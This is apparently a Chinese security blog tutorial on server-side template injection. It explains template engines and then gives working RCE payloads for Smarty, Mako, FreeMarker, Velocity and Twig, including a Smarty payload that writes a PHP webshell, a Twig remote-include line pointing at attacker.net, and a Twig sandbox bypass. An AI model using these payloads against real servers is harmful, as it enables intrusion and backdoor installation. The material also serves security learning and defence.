> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/be0lJ3qQjXC35UYPaUoYNQ)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

SSTI
----

当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑。

比如说

```
from flask import Flask    from flask import render_template    from flask import request    from flask import render_template_string    app = Flask(__name__)    @app.route('/test',methods=['GET', 'POST'])    def test():        template = '''            <div class="center-content error">                <h1>Oops! That page doesn't exist.</h1>                <h3>%s</h3>            </div>         ''' %(request.url)return render_template_string(template)    if __name__ == '__main__':        app.debug = True        app.run()
```

这段代码是一个经典的漏洞实例，漏洞在于 render_template_string 函数在渲染模板时使用了 %s 来动态的替换字符串。这也就是 Jinjia2 作为模版渲染引擎，将 {{]} 中的内容当作变量来进行解析和替换。

这里附一张其他师傅找到的框架模板结构图：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2DqB3tiac85ILm4J7K2RaWr01rnxlotZvEWZlGdM6FAce3aYIoY08aJ6Ig/640?wx_fmt=png)

模板引擎
----

模板引擎（这里特指用于 Web 开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的 HTML 文档。

模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。

模板渲染
----

*   前后端渲染不共用一套代码
    
*   Server 端通过 PHP、Java 等服务，解析模版文件，请求数据。将数据直接渲染到模版文件上，将模版文件处理为 HTML
    
*   Server 端将 HTML 返回给浏览器
    
*   浏览器端解析 HTML，执行 JavaScript 代码 简单来说呢，模板渲染又分为前端渲染、后端渲染和浏览器渲染。模板是用于从数据（变量）到实际的视觉表现（HTML 代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。也就是说，我们将数据，填充到模版中，然后让渲染引擎将填充的内容生成 html 文本，返回到浏览器中。如果说有什么好处的话，就是能够更快速的显示数据内容，提高效率。
    

### 后端渲染（SSR、服务端渲染）

后端渲染 HTML 的情况下，浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的 HTML 字符串，这里的计算就是服务器经过解析存放在服务器端的模板文件来完成的，在这种情况下，浏览器只进行了 HTML 的解析，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把 HTML 所代表的图像显示给用户。简单来说就是使用 JS 来渲染页面大部分内容，代表是现在流行的 SPA 单页面应用。

后端渲染的优势：

*   首屏性能。服务端渲染不需要先下载一堆 js 和 css 后才能看到页面（首屏性能）
    
*   SEO
    
*   服务端渲染不用关心浏览器兼容性问题（随意浏览器发展，这个优点逐渐消失）
    
*   对于电量不给力的手机或平板，减少在客户端的电量消耗很重要
    

通俗点来说，后端渲染的实现就是网页在服务器渲染完成，再返回给浏览器，网页是在服务器端进行渲染，而不是在浏览器端进行渲染。

那么后端渲染的弊端又是什么：

*   前后端杂揉在一起，不方便本地开发、本地模拟调试，也不方便自动化测试
    
*   前端被约束在后端开发的模式中，不能充分使用前端的构建生态，开发效率低下
    
*   项目难以管理和维护，也可能会有前后端职责不清的问题。
    
*   后端渲染结束之后，需要进行网络传输的体积增大，带来的网络损耗和网络传输时间问题，这也就是我们经常遇到的页面白屏的问题
    

### 前段渲染（SPA、单页面应用）

前端渲染就是指浏览器会从后端得到一些信息，这些信息或许是适用于题主所说的 angularjs 的模板文件，亦或是 JSON 等各种数据交换格式所包装的数据，甚至是直接的合法的 HTML 字符串。这些形式都不重要，重要的是，将这些信息组织排列形成最终可读的 HTML 字符串是由浏览器来完成的，在形成了 HTML 字符串之后，再进行显示。

当我们从浏览器输入一个 url 的时候，浏览器会将我们输入的 url 发送到服务器上，然后再从服务器返回 html+css+js(js 代码由浏览器执行)。然后我们的客户端，也就是我们的浏览器再通过 Ajax 请求（API），然后服务器接收请求返回数据，浏览器接收到数据后再进行动态渲染，局部刷新页面，这就是我们的前端渲染。

特点：

*   局部刷新，无需每次都进行完整页面请求
    
*   懒加载。只加载可视区域数据，滚动后加载其它数据
    
*   富交互。使用 JS 酷炫效果
    
*   节约服务器成本。省电省钱，支持 CDN 部署，服务端渲染时间减小
    
*   天生的关注分离设计
    
*   http response 大小也会减少
    
*   JS 一次学习，到处使用。Web、Serve、Mobile、Desktop
    

同样前端渲染也存在弊端：

*   可能会增加 HTTP 请求
    
*   只能使用客户端静态数据，不如后台模板来得强大。
    
*   对搜索引擎不友好。
    
*   即使资源缓存了，仍然需要 js 运行一遍来生成界面，这样比浏览器直接渲染缓存的资源要慢。
    

### 同构渲染

同构渲染指前后端共用 JS，首次渲染时使用 Node.js 来直出 HTML。一般来说同构渲染是介于前后端中的共有部分。

所谓同构，简单的说就是一份代码，即能进行服务端渲染（server-side rendering => ssr）, 也能通过客户端来渲染（client-side rendering => csr）。

而同构渲染，则是一种渲染方案。它是指，服务端先通过 SSR，生成 html 以及初始化数据，客户端拿到代码和初始化数据后，通过对 html 的 dom 进行 patch 和事件绑定，即客户端激活（client-side hydration => csh）。

优势：

1.  有助于 SEO
    
2.  共用前端代码，节省开发时间
    
3.  提高首屏性能 问题：
    
4.  性能，大量计算性能低、个性化的缓存无法实现
    
5.  不容忽视的服务器端和浏览器环境差异（前后端渲染不一致）
    
6.  内存溢出
    
7.  异步操作
    
8.  simple store（redux）
    

结论：总的来说，同构渲染实施难度大，不够优雅，无论在前端还是服务端，都需要额外改造。

### 实例 1

说完了具体的模版引擎和渲染，简单的举一个例子 首先定一个模版

```
<html>    <div>{$what}</div>    </html>
```

其中 {$what} 为数据，如果想渲染到代码中，渲染完成以后

```
<html><br style="box-sizing: border-box;">    <div>decease</div><br style="box-sizing: border-box;"></html><br style="box-sizing: border-box;">
```

那么 {$what} 参数又是如何进行传递的呢？这就需要结合使用的模版引擎进行分析。如果使用的模版引擎为 smarty。想要传递的话，js 代码就可以这样

```
var tpl= new jSmart(tplStr);//tplStr就是模板的字符串。var content = "Hello World";tpl.fetch({what:content});
```

其他的就是由模版引擎来进行渲染执行了。

### 实例 2

创建模版文件 test.tpl

```
<div>    {%$a%}</div>
```

后端设置变量：

```
$smarty->assign('a', 'give data');
```

展示模板：

```
$smarty->display("test.tpl");
```

经过渲染之后，到前端就会变成

```
<div><br style="box-sizing: border-box;">    give data<br style="box-sizing: border-box;"></div><br style="box-sizing: border-box;">
```

这种方式的特点是展示数据快，直接后端拼装好数据与模板，展现到用户面前。

### 为何需要服务器模版

为什么 HTML 代码和应用程序逻辑混合在一起不好，假如你使用下面的代码为你的用户提供服务：

```
<html>    <head>            <title>login    </head>    <body>        <form method = "POST" aciton = "login.php">            <input type = "text" name = "user" value = "Alice">            <input type = "password" name = "pass" value = "">            <button type = "submit">submit</button>        </form>    </body></html>
```

观察这段代码，不仅是静态 HTML。而是用户名由 cookie 中获取并自动填写。这样的话，只要登录过一次，在一段时间之内就不需要重复输入，但同样存在一个问题，那就是必须通过某种方法将数据插入到 HTML 文档中，其中有两种方法可以实现，一种是正确的，一种是有危害的。

比如解决该问题的完全错误的方法：

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2DqbWDiaVA8ljOxqmCExU8XpRXzyOEQn0DHcrHncZjayKEe3xZPUbT4icSg/640?wx_fmt=jpeg)

观察一下这段代码，发现会有很多问题，代码不仅仅是对用户的输入进行处理，HTML 代码和 PHP 代码混合在一起，这样直接看起来的话非常难以理解。部分 HTML 代码分布在多个函数中，以我写代码的情况来说，如果后期需要修改就会发现无比的麻烦。  

当然这个例子是故意写的这么复杂，不过也可以通过格式化进行一定的优化，不过还是，在一个完整的项目中，即使代码格式再好，也没法很有效的进行管理。

与上面的代码相比，服务器端模版提供了一种极为便利的方法来管理动态生成的 HTML 代码。最大的优点就是可以在服务器端生成 HTML 页面。

比如：

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2DqnnTdAb1aYpNBHhvVB3Q9UdYiaWia61D3u4EibMK2ibiazr254sImfsNRcyw/640?wx_fmt=jpeg)

这就是上一个例子的代码做了一定的优化，不过依然是静态的。为了显示正确的信息而不使用大括号占位符，这里就可以使用一个模版引擎。对应的后端代码就应该是：  

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2DqefTumgJiaSQWnWVpLWmmVzTGFiapibHvcu589BoCjc2ejAeF7gznVl2fA/640?wx_fmt=jpeg)

这段代码的意思非常明确了，首先加载 login.tpl 模板文件，然后对于模板中名称相同的变量赋值，然后调用 show() 函数，相应的替换掉对应的内容，并且输出对应的 HTML 代码。  

当然，这是最简单的进行剖析，如果说，在真实的系统中，或者说当你拿到一套代码后，简单的分析以后，并没有发现漏洞利用，那下一步应该怎么做呢，那就是进行环境的分析，这样可以更准确的找到访问的内容。许多的模版系统都会公开一个名称空间对象，其中包含范围中的所有内容，以及一种管用的方式来列出对象的属性和方法。如果没有发现内置的 self 对象，那就需要进行爆破变量名。为此国外的 James Kettle 安全研究员通过在 GitHub 上爬取 PHP 项目中使用 GET/POST 变量名来创建一个单词表，并通过 SecLists 和 Burp Intruder 的单词表集合公开发布了它。

开发人员提供的对象很有可能包含部分敏感信息，并且在应用程序中不同模版之间可能也有所不同。

同样 James Kettle 安全研究员的研究表明，似乎模版引擎本身就存在着某些缺陷，但除非是模版引擎自身推荐给用户，否则如何防止模版注入这件事，就是由开发人员来承担。

有时候短短的 30 秒的文档阅读，就可以取得 RCE（当然，这可能是无比强大的大牛了）。比如说，利用为封装的 Smarty 就很简单：

```
{php}echo 'id';{/php}
```

Mako 同样易于利用：

```
<%import osx = os.popen('id').read()%>${x}
```

当然，在这些模块引擎中尝试通过限制应用程序的逻辑来阻止模版注入攻击。也有一部分是通过限制模版和使用沙盒模版作为安全措施，来实现对不受信任的输入进行安全处理。

FreeMarker
----------

FreeMarker 是一款 模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本 (HTML 网页，电子邮件，配置文件，源代码等) 的通用工具。它不是面向最终用户的，而是一个 Java 类库，是一款程序员可以嵌入他们所开发产品的组件。

模板编写为 FreeMarker Template Language (FTL)。它是简单的，专用的语言， 不是 像 PHP 那样成熟的编程语言。那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2Dq7TrqwRo5RkOSS5nvPV7AUIGSJjdq6BVCuLyiaflibbEf5M6n4WtQzGwQ/640?wx_fmt=png)

这种方式被称为 MVC (模型 视图 控制器) 模式，对于动态网页来说，是一种特别流行的模式。它帮助从开发人员 (Java 程序员) 中分离出网页设计师(HTML 设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。而 FreeMarker 最初的设计，是被用来在 MVC 模式的 Web 开发框架中生成 HTML 页面的，它没有被绑定到 Servlet 或 HTML 或任意 Web 相关的东西上。它也可以用于非 Web 应用环境中。FreeMarker 是 免费的， 基于 Apache 许可证 2.0 版本发布。

回归主题 FreeMarker 是最流行的 Java 模版语言之一，当然，官方也同样对允许用户提供模版上传权限的危害进行了解释。详细的内容大家可以自行查看： `http://freemarker.org/docs/app_faq.html#faq_template_uploading_security http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new`

根据官方提供的文档或者方法来看，提供了一个公共类 Execute，而这个类是用来实现 TemplateMethodModel，也就是赋予 FreeMarker 执行外部命令的能力，将派生一个新的进程并内联发送到模版中的任何位置。比如说：

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)
```

记住这个有效的载荷，以后还会用到。

Velocity
--------

对于这个模版来说，大部分人可能了解很少或者说是几乎不了解，但是但凡你知道 Apache Solr RCE 漏洞（CVE-2019-0193）就可能明白了，之所以 Solr 产生 RCE 漏洞，原因就在于 VelocityResponseWriter 组件。关于 Solr RCE 漏洞在这就不过多的进行解释了。Velocity 是另一种流行的 Java 模板语言，要利用起来比较棘手。没有相关的提示可以用来提示危险的功能，也没有明显的默认变量列表，这里借用一张 James Kettle 安全研究员使用 Burp 攻击进行暴力破解变量名的图，变量名在 “有效负载” 的左侧，服务器输出内容在右侧

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2DqHSrthsQJGWFnEbv8GuXxqhCJcXIRfNbhFFrndtooFqXibNDlEnsezgg/640?wx_fmt=png)

```
ClassTool：用于在模板中使用Java反射的工具<br style="box-sizing: border-box;">默认键：$ class<br style="box-sizing: border-box;">
```

根据官方手册给出的文档，可发现一种方法和属性：

```
<br style="box-sizing: border-box;">$ class.inspect（类/对象/字符串）<br style="box-sizing: border-box;">返回一个新的ClassTool实例，该实例检查指定的类或对象<br style="box-sizing: border-box;"><br style="box-sizing: border-box;">$ class.type 返回正在检查的实际Class<br style="box-sizing: border-box;">
```

换句话说，可以将 class.type 链接起来来获得对任意对象的引用。然后就可以使用 Runtime.exec（）在目标系统上执行任意 shell 命令。比如产生时间延迟的模版：

```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()[5 second time delay] 0
```

获取 shell 命令的输出就比较麻烦：

```
#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#endtomcat7
```

Smarty
------

Smarty 是 Smarty 是一个 PHP 的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。Smarty 是最流行的 PHP 模版语言之一，并为不受信任的模版执行提供了一种安全模式。根据说明，可以强制执行 PHP 函数的白名单，以至于使模版无法直接的调用 system()。但同样，不会阻止我们在可以获取引用的任何类上进行调用。根据官方文档显示，可以使用内置变量来访问各种环境变量，包括当前文件在 smarty 内置变量来访问各种环境变量，包括当前文件在 SCRIPT_NAME 的位置。变量名暴力破解会很快显示出 self 对象，该对象是对当前模板的引用。在这里我们使用变量名暴力破解会很快显示出 self 对象，该对象是对当前模板的引用。在这里我们来看一下 uwetews-Github 上的内容。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2DqmJTCsAZn2icV7mzNNqRF2Fyc5Q7KOV1fK1Eia25B38mX8lP8wb3u4KhA/640?wx_fmt=png)

仔细观察 getStreamVariable 方法，发现可以用来读取服务器上可以读写权限的任何文件。

```
{self::getStreamVariable("file:///proc/self/loginuid")}1000{self::getStreamVariable($SCRIPT_NAME)}<?phpdefine("SMARTY_DIR",'/usr/share/php/Smarty/');require_once(SMARTY_DIR.'Smarty.class.php');...
```

除了这种方法之外，我们还可以调用任意的静态方法。Smarty 公开了一系列的静态类，其中重要的就是 Smarty_Internal_Write_File，这个类具有的方法：

```
public function writeFile($_filepath, $_contents, Smarty $smarty)
```

这个功能的主要作用是创建和覆盖任意文件，所以可以在 webroot 中创建任意的 PHP 后门，从而提供进一步控制服务器的方法。不过仔细的看一下相关的参数，发现第三个参数的要求是拒绝非 Smarty 类型的输入，这就意味着我们需要获取对 Smarty 对象的引用。我们进一步的进行代码分析

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RWY5LUgkf9GxMZa5Ribta2Dqt4qHloTTKwknKDy6zhA3kOQUCb01XN481FmJ7yc0jp8mGRibiaLKoO3w/640?wx_fmt=jpeg)

发现 self :: clearConfig（）方法是合适的。所以最终的 payload 就是利用后门覆盖相关的模版文件。  

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

Twig
----

Twig 是一个灵活，快速，安全的 PHP 模板语言。它将模板编译成经过优化的原始 PHP 代码。Twig 拥有一个 Sandbox 模型来检测不可信的模板代码。Twig 由一个灵活的词法分析器和语法分析器组成，可以让开发人员定义自己的标签，过滤器并创建自己的 DSL。示例模板：

```
{% extends "layout.html" %}{% block content %}  Content of the page...{% endblock %}
```

默认情况下，它具有类似于 Smarty 的安全模式的限制，还有两个重要的附加限制 - 无法调用静态方法，并且所有函数的返回值都强制转换为字符串。这意味着我们不能像使用 Smarty 的 self::clearConfig() 那样使用函数来获取对象引用。与 Smarty 不同，Twig 已记录了其 self 对象（_self），因此我们无需强制使用任何变量名。

该_self 对象不包含任何有用的方法，但确实有一个 ENV 是指属性 Twig_Environment 对象。Twig_Environment 上的 setCache（）方法可用于更改 Twig 尝试从中加载和执行编译的模板（PHP 文件）的位置。所以，很明显，攻击方法可以通过将缓存位置设置为远程服务器来引入 “远程文件包含”

```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

但是根据实际的情况，PHP 的默认状态下会通过 allow_url_include 来禁止包含远程文件。

那我们就只能从新再来找一下看看能不能从其他的方面入手了，进一步的对代码进行分析，发现在 getFilter() 方法中的 874 行上有对危险函数 call_user_func 的调用。如果我们能够控制这个参数，就可以用它来调用任意的 PHP 函数。

```
public function getFilter($name){        [snip]        foreach ($this->filterCallbacks as $callback) {        if (false !== $filter = call_user_func($callback, $name)) {            return $filter;        }    }    return false;}public function registerUndefinedFilterCallback($callable){    $this->filterCallbacks[] = $callable;}
```

所以，执行任意的 shell 命令只是将 exec 作为过滤器回调，然后在调用 getFilter 即可。

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)
```

Twig（沙盒）
--------

Twig 的沙盒相比原有 Twig 更多的引入了其他的限制。通过禁用属性检索，并添加函数和方法调用的白名单，所以一般情况下，我们不能调用任何函数。不过可以来看一段代码：

```
public function checkMethodAllowed($obj, $method){  if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {        return true;    }
```

仔细分析一下这个代码，发现可以通过 Twig_TemplateInterface 的对象上调用任何方法，该对象恰巧又包含了_self。该_self 对象的 displayBlock 方法提供了各种的工具。

```
public function displayBlock($name, array $context, array $blocks = array(), $useBlocks = true){    $name = (string) $name;    if ($useBlocks && isset($blocks[$name])) {        $template = $blocks[$name][0];        $block = $blocks[$name][1];    } elseif (isset($this->blocks[$name])) {        $template = $this->blocks[$name][0];        $block = $this->blocks[$name][1];    } else {        $template = null;        $block = null;    }    if (null !== $template) {        try {            $template->$block($context, $blocks);        } catch (Twig_Error $e) {
```

其中可能会滥用 call 来绕过限制白名单，并可以在用户可以获取的任何对象上进行调用。比如说在不带参数的情况下调用 userObject 对象上的敏感方法。

```
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
```

另外的话还有 JADE 框架，但因为还没有完全理解透彻，所以只能等明白后在继续写了。这里就简单的做个说明。JADE (Java Agent DEvelopment Framework) 是一个完全用 Java 语言实现的软件框架。它通过一个兼容 FIPA 规范的中间件来简化了中间多代理的实现。，支持调试和部署阶段的图形工具。代理平台可以跨机器分布（其中甚至不需要共享相同的操作系统）和配置，可以通过远程图形界面控制。该配置可以在运行，甚至改变由从一台计算机移动到另一个代理时间，需要时。JADE 是完全采用 Java 语言和最低系统要求是 Java 版本 1.4（运行时环境或的 JDK）。

案例也是在准备中。

参考
--

感谢各位大佬的精彩文章。

```
https://portswigger.net/research/server-side-template-injection<br style="box-sizing: border-box;">https://www.jianshu.com/p/aef2ae0498df<br style="box-sizing: border-box;">https://portswigger.net/research/server-side-template-injection<br style="box-sizing: border-box;">https://zhuanlan.zhihu.com/p/23972536<br style="box-sizing: border-box;">https://zhuanlan.zhihu.com/p/26366128<br style="box-sizing: border-box;">https://www.jianshu.com/p/14c3c4f61d90<br style="box-sizing: border-box;">https://www.cnblogs.com/Strive-count/p/6183327.html<br style="box-sizing: border-box;">https://blog.csdn.net/qq_45521281/article/details/107556915
```

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室，近三年来在网络安全技术方面开展研发项目 60 余项，获得各类自主知识产权 30 余项，省市级科技项目立项 20 余项，研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。对安全感兴趣的小伙伴可以加入或关注我们。

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RX4MU7S4WB8R6vF3JbUjA7K0ZtOPxqGSo1HGPhTDicQibOro93UYNBOwRPd4EFseGTDsl1tan0ZXcmw/640?wx_fmt=gif)